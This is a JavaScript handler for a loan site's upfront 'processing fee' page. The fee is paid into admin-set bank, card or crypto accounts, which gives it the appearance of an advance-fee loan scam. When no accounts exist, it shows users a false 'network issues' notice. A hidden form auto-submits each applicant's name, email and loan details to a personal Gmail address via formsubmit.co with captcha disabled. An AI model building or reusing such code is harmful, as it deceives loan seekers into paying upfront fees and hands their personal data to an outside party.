/**
 * Processing Fee Payment Handler
 */

// Get application data from URL parameters or sessionStorage
document.addEventListener('DOMContentLoaded', function() {
    loadApplicationData();
    initializePaymentForm();
});

// Load application data
function loadApplicationData() {
    // Try to get data from sessionStorage first
    const appData = {
        name: sessionStorage.getItem('applicantName') || 'N/A',
        email: sessionStorage.getItem('applicantEmail') || 'N/A',
        loanType: sessionStorage.getItem('loanType') || 'N/A',
        loanAmount: sessionStorage.getItem('loanAmount') || 'N/A'
    };

    // Update summary display
    document.getElementById('summaryName').textContent = appData.name;
    document.getElementById('summaryEmail').textContent = appData.email;
    document.getElementById('summaryLoanType').textContent = appData.loanType;
    document.getElementById('summaryLoanAmount').textContent = appData.loanAmount;

    // Update hidden form fields
    document.getElementById('hiddenName').value = appData.name;
    document.getElementById('hiddenEmail').value = appData.email;
    document.getElementById('hiddenLoanType').value = appData.loanType;
    document.getElementById('hiddenLoanAmount').value = appData.loanAmount;
    
    // Load fee configuration from admin settings
    loadFeeConfiguration();
    
    // Load payment accounts from admin settings
    loadPaymentAccounts();
}

// Load fee configuration from admin
function loadFeeConfiguration() {
    const feeConfig = JSON.parse(localStorage.getItem('processingFeeConfig') || '{}');
    
    if (feeConfig.enabled === false) {
        // Hide fee section if disabled
        document.querySelector('.fee-breakdown').style.display = 'none';
        return;
    }
    
    const processingFee = parseFloat(feeConfig.processingFee || 99);
    const adminFee = parseFloat(feeConfig.adminFee || 50);
    const totalFee = parseFloat(feeConfig.totalFee || 149);
    
    // Update fee breakdown in the page
    const feeBreakdown = document.querySelector('.fee-breakdown');
    if (feeBreakdown) {
        const feeItems = feeBreakdown.querySelectorAll('.fee-item');
        if (feeItems[0]) {
            feeItems[0].querySelector('.fee-amount').textContent = '$' + processingFee.toFixed(2);
        }
        if (feeItems[1]) {
            feeItems[1].querySelector('.fee-amount').textContent = '$' + adminFee.toFixed(2);
        }
        if (feeItems[2]) {
            feeItems[2].querySelector('.fee-amount strong').textContent = '$' + totalFee.toFixed(2);
        }
    }
    
    // Update fee description
    if (feeConfig.description) {
        const feeNote = document.querySelector('.fee-note p');
        if (feeNote) {
            feeNote.innerHTML = '<strong>Important:</strong> ' + feeConfig.description;
        }
    }
    
    // Update submit button text
    const paymentBtn = document.getElementById('paymentBtnText');
    if (paymentBtn) {
        paymentBtn.textContent = 'Pay $' + totalFee.toFixed(2);
    }
    
    // Update hidden form field
    const hiddenFeeField = document.querySelector('input[name="Processing Fee"]');
    if (hiddenFeeField) {
        hiddenFeeField.value = '$' + totalFee.toFixed(2);
    }
}

// Load payment accounts from admin
function loadPaymentAccounts() {
    const accounts = JSON.parse(localStorage.getItem('activePaymentAccounts') || '[]');
    
    if (accounts.length === 0) {
        return; // User will see a message when they click "Proceed to Payment"
    }
}

// Display payment accounts for user selection
function displayPaymentAccounts() {
    const accounts = JSON.parse(localStorage.getItem('activePaymentAccounts') || '[]');
    
    // Get or create payment accounts section
    let accountsSection = document.getElementById('paymentAccountsSection');
    if (!accountsSection) {
        accountsSection = document.createElement('div');
        accountsSection.id = 'paymentAccountsSection';
        accountsSection.className = 'step active';
        
        const summaryStep = document.getElementById('summaryStep');
        summaryStep.parentNode.insertBefore(accountsSection, summaryStep.nextSibling);
    }
    
    accountsSection.style.display = 'block';
    accountsSection.innerHTML = `
        <h2 class="step-title">Select Payment Method</h2>
        <p class="step-description">Choose your preferred payment method below to proceed with the processing fee payment</p>
        
        <div class="payment-accounts-list">
            ${accounts.map((account, index) => `
                <div class="payment-account-card">
                    <div class="account-header">
                        <div class="account-icon">${getAccountIcon(account.type)}</div>
                        <div class="account-details">
                            <h3>${account.name}</h3>
                            <p class="account-type">${account.type}</p>
                        </div>
                    </div>
                    <div class="account-info">
                        <div class="info-row">
                            <span class="info-label">Account Number:</span>
                            <span class="info-value">${account.number}</span>
                        </div>
                        ${account.routing ? `
                        <div class="info-row">
                            <span class="info-label">Routing Number:</span>
                            <span class="info-value">${account.routing}</span>
                        </div>
                        ` : ''}
                        <div class="info-row">
                            <span class="info-label">Account Holder:</span>
                            <span class="info-value">${account.holder}</span>
                        </div>
                        ${account.instructions ? `
                        <div class="account-instructions">
                            <strong>Payment Instructions:</strong>
                            <p>${account.instructions}</p>
                        </div>
                        ` : ''}
                    </div>
                    <button type="button" class="btn-select-account" onclick="selectPaymentAccount(${index})">
                        Select This Account
                    </button>
                </div>
            `).join('')}
        </div>
        
        <style>
            .payment-accounts-list {
                display: grid;
                gap: 1.5rem;
                margin: 2rem 0;
            }
            
            .payment-account-card {
                background: rgba(15, 58, 82, 0.4);
                border: 1.5px solid var(--border-color);
                border-radius: 10px;
                padding: 2rem;
                transition: all 0.3s ease;
            }
            
            .payment-account-card:hover {
                border-color: var(--accent-primary);
                transform: translateY(-3px);
                box-shadow: 0 8px 20px rgba(0, 180, 216, 0.3);
            }
            
            .account-header {
                display: flex;
                align-items: center;
                gap: 1.5rem;
                margin-bottom: 1.5rem;
                padding-bottom: 1.5rem;
                border-bottom: 1px solid var(--border-color);
            }
            
            .account-icon {
                font-size: 3rem;
            }
            
            .account-details h3 {
                font-size: 1.5rem;
                color: #00d4ff;
                margin-bottom: 0.25rem;
            }
            
            .account-type {
                color: var(--text-secondary);
                font-size: 1rem;
            }
            
            .account-info {
                margin-bottom: 1.5rem;
            }
            
            .info-row {
                display: flex;
                justify-content: space-between;
                padding: 0.75rem 0;
                border-bottom: 1px solid rgba(100, 200, 230, 0.2);
            }
            
            .info-label {
                color: var(--text-secondary);
                font-weight: 600;
            }
            
            .info-value {
                color: var(--text-color);
                font-weight: 600;
                font-family: 'Courier New', monospace;
            }
            
            .account-instructions {
                margin-top: 1rem;
                padding: 1rem;
                background: rgba(0, 180, 216, 0.1);
                border-radius: 6px;
                border-left: 3px solid var(--accent-primary);
            }
            
            .account-instructions strong {
                color: #00d4ff;
                display: block;
                margin-bottom: 0.5rem;
            }
            
            .account-instructions p {
                color: var(--text-secondary);
                line-height: 1.6;
            }
            
            .btn-select-account {
                width: 100%;
                padding: 1rem;
                background: linear-gradient(135deg, #00b4d8 0%, #0096ba 100%);
                color: white;
                border: none;
                border-radius: 6px;
                font-weight: 600;
                font-size: 1rem;
                cursor: pointer;
                transition: all 0.3s ease;
                text-transform: uppercase;
                letter-spacing: 0.5px;
            }
            
            .btn-select-account:hover {
                background: linear-gradient(135deg, #0096ba 0%, #007a95 100%);
                transform: translateY(-2px);
                box-shadow: 0 6px 16px rgba(0, 180, 216, 0.4);
            }
        </style>
    `;
}

function getAccountIcon(type) {
    const icons = {
        'Bank Account': '🏦',
        'Credit Card': '💳',
        'PayPal': '💰',
        'Crypto Wallet': '₿',
        'Wire Transfer': '💸'
    };
    return icons[type] || '💳';
}

function selectPaymentAccount(index) {
    const accounts = JSON.parse(localStorage.getItem('activePaymentAccounts') || '[]');
    const account = accounts[index];
    
    if (!account) return;
    
    // Store selected account info
    sessionStorage.setItem('selectedPaymentAccount', JSON.stringify(account));
    
    // Get the fee configuration
    const feeConfig = JSON.parse(localStorage.getItem('processingFeeConfig') || '{}');
    const totalFee = feeConfig.totalFee || '149.00';
    
    // Hide accounts section
    const accountsSection = document.getElementById('paymentAccountsSection');
    if (accountsSection) {
        accountsSection.style.display = 'none';
    }
    
    // Show success message with account details
    const paymentSuccess = document.getElementById('paymentSuccess');
    if (paymentSuccess) {
        paymentSuccess.innerHTML = `
            <h3>✓ Payment Account Selected!</h3>
            <p style="margin: 1.5rem 0;">Please make your payment of <strong style="color: #00d4ff; font-size: 1.3rem;">$${totalFee}</strong> to the following account:</p>
            
            <div style="text-align: left; margin: 2rem 0; padding: 2rem; background: rgba(15, 58, 82, 0.4); border-radius: 10px; border: 1px solid var(--border-color);">
                <h4 style="color: #00d4ff; margin-bottom: 1.5rem; font-size: 1.3rem;">Payment Details:</h4>
                
                <div style="margin-bottom: 1rem;">
                    <strong style="color: var(--text-secondary); display: block; margin-bottom: 0.5rem;">Account Name:</strong>
                    <p style="color: var(--text-color); font-size: 1.2rem; margin: 0; font-weight: 600;">${account.name}</p>
                </div>
                
                <div style="margin-bottom: 1rem;">
                    <strong style="color: var(--text-secondary); display: block; margin-bottom: 0.5rem;">Account Type:</strong>
                    <p style="color: var(--text-color); font-size: 1.1rem; margin: 0;">${account.type}</p>
                </div>
                
                <div style="margin-bottom: 1rem;">
                    <strong style="color: var(--text-secondary); display: block; margin-bottom: 0.5rem;">Account Number:</strong>
                    <p style="color: var(--text-color); font-size: 1.2rem; margin: 0; font-family: 'Courier New', monospace; font-weight: 600;">${account.number}</p>
                </div>
                
                ${account.routing ? `
                <div style="margin-bottom: 1rem;">
                    <strong style="color: var(--text-secondary); display: block; margin-bottom: 0.5rem;">Routing Number:</strong>
                    <p style="color: var(--text-color); font-size: 1.2rem; margin: 0; font-family: 'Courier New', monospace; font-weight: 600;">${account.routing}</p>
                </div>
                ` : ''}
                
                <div style="margin-bottom: 1rem;">
                    <strong style="color: var(--text-secondary); display: block; margin-bottom: 0.5rem;">Account Holder:</strong>
                    <p style="color: var(--text-color); font-size: 1.1rem; margin: 0;">${account.holder}</p>
                </div>
                
                <div style="margin-bottom: 1rem;">
                    <strong style="color: var(--text-secondary); display: block; margin-bottom: 0.5rem;">Amount to Pay:</strong>
                    <p style="color: #00d4ff; font-size: 1.5rem; margin: 0; font-weight: 700;">$${totalFee}</p>
                </div>
                
                ${account.instructions ? `
                <div style="margin-top: 1.5rem; padding-top: 1.5rem; border-top: 1px solid var(--border-color);">
                    <strong style="color: #00d4ff; display: block; margin-bottom: 0.75rem;">Payment Instructions:</strong>
                    <p style="color: var(--text-secondary); margin: 0; line-height: 1.7; font-size: 1.05rem;">${account.instructions}</p>
                </div>
                ` : ''}
            </div>
            
            <div style="background: rgba(255, 193, 7, 0.1); padding: 1.5rem; border-radius: 8px; border-left: 4px solid #ffc107; margin: 2rem 0;">
                <p style="color: var(--text-secondary); margin: 0; line-height: 1.7;">
                    <strong style="color: #ffc107;">Important:</strong> After making the payment, please keep your payment receipt. 
                    We have sent these payment details to your email (<strong>${sessionStorage.getItem('applicantEmail')}</strong>). 
                    We will contact you within 24 hours to confirm your payment and proceed with your loan application.
                </p>
            </div>
            
            <a href="index.html" class="btn btn-primary" style="margin-top: 1.5rem; display: inline-block; padding: 1rem 2rem; text-decoration: none; background: linear-gradient(135deg, #00b4d8 0%, #0096ba 100%); border-radius: 6px; font-weight: 600; text-transform: uppercase;">Return to Home</a>
        `;
        paymentSuccess.style.display = 'block';
    }
    
    // Send payment account details to FormSubmit
    sendPaymentAccountSelection(account);
}

// Initialize payment form
function initializePaymentForm() {
    // Payment form is no longer used - accounts are shown instead
    // Payment account selection will be handled by showPaymentAccounts()
}

// Show payment accounts when user clicks "Proceed to Payment"
function showPaymentAccounts() {
    const accounts = JSON.parse(localStorage.getItem('activePaymentAccounts') || '[]');
    
    if (accounts.length === 0) {
        // No payment accounts configured by admin
        showNoAccountsMessage();
        return;
    }
    
    // Hide summary step
    const summaryStep = document.getElementById('summaryStep');
    if (summaryStep) {
        summaryStep.style.display = 'none';
    }
    
    // Show payment accounts
    displayPaymentAccounts();
}

// Show message when no payment accounts are configured
function showNoAccountsMessage() {
    const summaryStep = document.getElementById('summaryStep');
    if (summaryStep) {
        summaryStep.style.display = 'none';
    }
    
    const paymentSuccess = document.getElementById('paymentSuccess');
    if (paymentSuccess) {
        paymentSuccess.innerHTML = `
            <div style="text-align: center;">
                <div style="font-size: 4rem; margin-bottom: 1rem;">⚠️</div>
                <h3 style="color: #ffc107; margin-bottom: 1rem;">Quickload Accounts is having network issues</h3>
                <p style="color: var(--text-secondary); margin-bottom: 1.5rem; line-height: 1.7;">
                    Our payment system is currently being fixed. Please contact us directly to complete your payment for fast response and we will process your application immediately.
                </p>
                
                <div style="background: rgba(15, 58, 82, 0.4); padding: 2rem; border-radius: 10px; border: 1px solid var(--border-color); margin: 2rem 0;">
                    <h4 style="color: #00d4ff; margin-bottom: 1.5rem;">Contact Information:</h4>
                    
                    <div style="margin-bottom: 1rem;">
                        <strong style="color: var(--text-secondary); display: block; margin-bottom: 0.5rem;">📧 Email:</strong>
                        <a href="mailto:support@quickloan.com" style="color: #00d4ff; font-size: 1.1rem; text-decoration: none; font-weight: 600;">support@quickloan.com</a>
                    </div>
                    
                    <div style="margin-bottom: 1rem;">
                        <strong style="color: var(--text-secondary); display: block; margin-bottom: 0.5rem;">📞 Phone:</strong>
                        <a href="tel:+18005551234" style="color: #00d4ff; font-size: 1.1rem; text-decoration: none; font-weight: 600;">1-800-555-1234</a>
                    </div>
                    
                    <div style="margin-top: 1.5rem; padding-top: 1.5rem; border-top: 1px solid var(--border-color);">
                        <strong style="color: var(--text-secondary); display: block; margin-bottom: 0.5rem;">Your Application Reference:</strong>
                        <p style="color: var(--text-color); font-size: 1.2rem; font-family: 'Courier New', monospace; font-weight: 600; margin: 0;">
                            ${sessionStorage.getItem('applicantEmail') || 'REF-' + Date.now()}
                        </p>
                    </div>
                </div>
                
                <div style="background: rgba(0, 180, 216, 0.1); padding: 1.5rem; border-radius: 8px; border-left: 4px solid var(--accent-primary); margin: 2rem 0;">
                    <p style="color: var(--text-secondary); margin: 0; line-height: 1.7;">
                        <strong style="color: #00d4ff;">Note:</strong> Your application has been received and saved. 
                        Please mention your application reference when contacting us. We will provide you with payment instructions and process your application within 24 hours.
                    </p>
                </div>
                
                <div style="display: flex; gap: 1rem; justify-content: center; flex-wrap: wrap; margin-top: 2rem;">
                    <a href="mailto:support@quickloan.com?subject=Payment for Loan Application - ${sessionStorage.getItem('applicantEmail')}" 
                       class="btn btn-primary" 
                       style="display: inline-block; padding: 1rem 2rem; text-decoration: none; background: linear-gradient(135deg, #00b4d8 0%, #0096ba 100%); border-radius: 6px; font-weight: 600; text-transform: uppercase; color: white;">
                        📧 Email Us
                    </a>
                    <a href="tel:+18005551234" 
                       class="btn btn-secondary" 
                       style="display: inline-block; padding: 1rem 2rem; text-decoration: none; background: transparent; border: 2px solid #00b4d8; border-radius: 6px; font-weight: 600; text-transform: uppercase; color: #00b4d8;">
                        📞 Call Us
                    </a>
                </div>
                
                <a href="index.html" style="display: inline-block; margin-top: 2rem; color: var(--text-secondary); text-decoration: none;">
                    ← Return to Home
                </a>
            </div>
        `;
        paymentSuccess.style.display = 'block';
    }
    
    // Send notification to admin that payment accounts need to be set up
    sendNoAccountsNotification();
}

// Validate payment form
function validatePaymentForm() {
    clearPaymentErrors();
    let isValid = true;

    const cardName = document.getElementById('paymentCardName').value.trim();
    const cardNumber = document.getElementById('paymentCardNumber').value.replace(/\s/g, '');
    const expiryDate = document.getElementById('paymentExpiryDate').value;
    const cvv = document.getElementById('paymentCvcField').value;
    const address = document.getElementById('billingAddress').value.trim();
    const terms = document.getElementById('paymentTerms').checked;

    if (!cardName) {
        showPaymentError('paymentCardName', 'Please enter cardholder name');
        isValid = false;
    }

    if (!validateCardNumber(cardNumber)) {
        showPaymentError('paymentCardNumber', 'Please enter a valid card number');
        isValid = false;
    }

    if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiryDate)) {
        showPaymentError('paymentExpiryDate', 'Please enter expiry date in MM/YY format');
        isValid = false;
    }

    if (!/^\d{3,4}$/.test(cvv)) {
        showPaymentError('paymentCvcField', 'Please enter a valid CVV');
        isValid = false;
    }

    if (!address) {
        showPaymentError('billingAddress', 'Please enter billing address');
        isValid = false;
    }

    if (!terms) {
        showPaymentError('paymentTerms', 'You must agree to the payment terms');
        isValid = false;
    }

    return isValid;
}

// Validate card number using Luhn algorithm
function validateCardNumber(number) {
    if (!/^\d{13,19}$/.test(number)) return false;
    
    let sum = 0;
    let isEven = false;
    
    for (let i = number.length - 1; i >= 0; i--) {
        let digit = parseInt(number[i], 10);
        if (isEven) {
            digit *= 2;
            if (digit > 9) digit -= 9;
        }
        sum += digit;
        isEven = !isEven;
    }
    
    return sum % 10 === 0;
}

// Show payment error
function showPaymentError(fieldId, message) {
    const errorElement = document.getElementById(`${fieldId}-error`);
    const inputElement = document.getElementById(fieldId);

    if (errorElement) {
        errorElement.textContent = message;
        errorElement.style.display = 'block';
    }

    if (inputElement) {
        inputElement.classList.add('error');
    }
}

// Clear payment errors
function clearPaymentErrors() {
    const errorMessages = document.querySelectorAll('.error-message');
    const errorInputs = document.querySelectorAll('.error');

    errorMessages.forEach(error => {
        error.style.display = 'none';
        error.textContent = '';
    });

    errorInputs.forEach(input => {
        input.classList.remove('error');
    });
}

// Initialize card visualization
function initializeCardVisualization() {
    const cardName = document.getElementById('paymentCardName');
    const cardNumber = document.getElementById('paymentCardNumber');
    const expiryDate = document.getElementById('paymentExpiryDate');
    const cvcField = document.getElementById('paymentCvcField');
    const cardWrapper = document.getElementById('paymentCardWrapper');

    if (cardName) {
        cardName.addEventListener('input', (e) => {
            document.getElementById('paymentCardHolderDisplay').textContent = 
                e.target.value.toUpperCase() || 'CARDHOLDER';
        });
    }

    if (cardNumber) {
        cardNumber.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\s/g, '');
            let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
            e.target.value = formattedValue;

            // Detect card type
            const firstDigit = value[0];
            let cardType = 'VISA';
            if (firstDigit === '4') cardType = 'VISA';
            else if (firstDigit === '5') cardType = 'MASTERCARD';
            else if (firstDigit === '3') cardType = 'AMEX';
            else if (firstDigit === '6') cardType = 'DISCOVER';

            document.getElementById('paymentCardType').textContent = cardType;
            document.getElementById('paymentCardDisplay').textContent = 
                formattedValue || '•••• •••• •••• ••••';
        });
    }

    if (expiryDate) {
        expiryDate.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 2) {
                value = value.slice(0, 2) + '/' + value.slice(2, 4);
            }
            e.target.value = value;
            document.getElementById('paymentCardExpDisplay').textContent = value || 'MM/YY';
        });
    }

    if (cvcField) {
        cvcField.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
            document.getElementById('paymentCvcDisplay').value = e.target.value;
        });

        cvcField.addEventListener('focus', () => {
            if (cardWrapper) cardWrapper.classList.add('flipped');
        });

        cvcField.addEventListener('blur', () => {
            if (cardWrapper) cardWrapper.classList.remove('flipped');
        });
    }
}

// Send payment account selection to FormSubmit
function sendPaymentAccountSelection(account) {
    // Stop submitting selection to external FormSubmit service.
    // Store the selection locally so the site can show confirmations
    // and the admin can review selections in localStorage/sessionStorage.
    try {
        sessionStorage.setItem('selectedPaymentAccount', JSON.stringify(account));
        sessionStorage.setItem('paymentSelectionTimestamp', new Date().toISOString());
        // Optionally, update a local activity log for admin review
        const log = JSON.parse(localStorage.getItem('paymentSelectionsLog') || '[]');
        log.unshift({ account: account, at: new Date().toISOString() });
        localStorage.setItem('paymentSelectionsLog', JSON.stringify(log));
    } catch (e) {
        console.warn('Could not persist payment selection locally:', e);
    }

    // Do NOT redirect to external formsubmit.co. Keep user on the local page.
    console.log('Payment account selected (not sent to external):', account);
}

// Send notification when no payment accounts are configured
function sendNoAccountsNotification() {
    const appData = {
        name: sessionStorage.getItem('applicantName') || 'N/A',
        email: sessionStorage.getItem('applicantEmail') || 'N/A',
        loanType: sessionStorage.getItem('loanType') || 'N/A',
        loanAmount: sessionStorage.getItem('loanAmount') || 'N/A'
    };
    
    const feeConfig = JSON.parse(localStorage.getItem('processingFeeConfig') || '{}');
    const totalFee = feeConfig.totalFee || '149.00';
    
    // Create a hidden form to submit the notification
    const form = document.createElement('form');
    form.method = 'POST';
    form.action = 'https://formsubmit.co/ojecgrv@gmail.com';
    form.target = '_blank';
    
    const fields = {
        '_subject': '⚠️ URGENT: Payment Accounts Not Configured - Client Waiting',
        '_template': 'table',
        '_captcha': 'false',
        'Alert': 'PAYMENT ACCOUNTS NOT CONFIGURED',
        'Status': 'Client attempted to pay but no payment accounts are set up',
        'Action Required': 'Log in to admin panel and add payment accounts immediately',
        'Applicant Name': appData.name,
        'Applicant Email': appData.email,
        'Loan Type': appData.loanType,
        'Loan Amount': appData.loanAmount,
        'Processing Fee': '$' + totalFee,
        'Timestamp': new Date().toLocaleString(),
        'Admin Panel': 'Navigate to admin.html → Payment Accounts → Add New Account'
    };
    
    for (const [name, value] of Object.entries(fields)) {
        const input = document.createElement('input');
        input.type = 'hidden';
        input.name = name;
        input.value = value;
        form.appendChild(input);
    }
    
    document.body.appendChild(form);
    form.submit();
    document.body.removeChild(form);
}
